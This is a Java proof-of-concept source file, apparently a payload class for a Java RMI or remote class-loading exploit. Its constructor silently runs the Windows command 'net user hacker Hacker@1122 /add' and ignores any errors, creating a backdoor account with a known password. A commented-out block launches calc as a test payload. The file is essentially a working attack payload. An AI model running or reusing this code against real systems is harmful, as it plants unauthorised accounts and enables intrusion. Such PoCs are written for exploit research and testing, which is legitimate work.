/**
 * Created by IntelliJ IDEA.
 * User: tridentj
 * Date: 2021/8/20
 * Time: 14:27
 **/
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class Poc2 extends UnicastRemoteObject{
    
    public Poc2() throws RemoteException{
        try {
            Runtime.getRuntime().exec("net user hacker Hacker@1122 /add");
        } catch (Exception e) {
            //
        }
    }
    /*
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            Process pc = rt.exec("calc");
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
    */
    public static void main(String[] args){
        try {
            Poc2 poc = new Poc2();
        }catch (Exception e){
            e.printStackTrace();
        }
        
    }
}
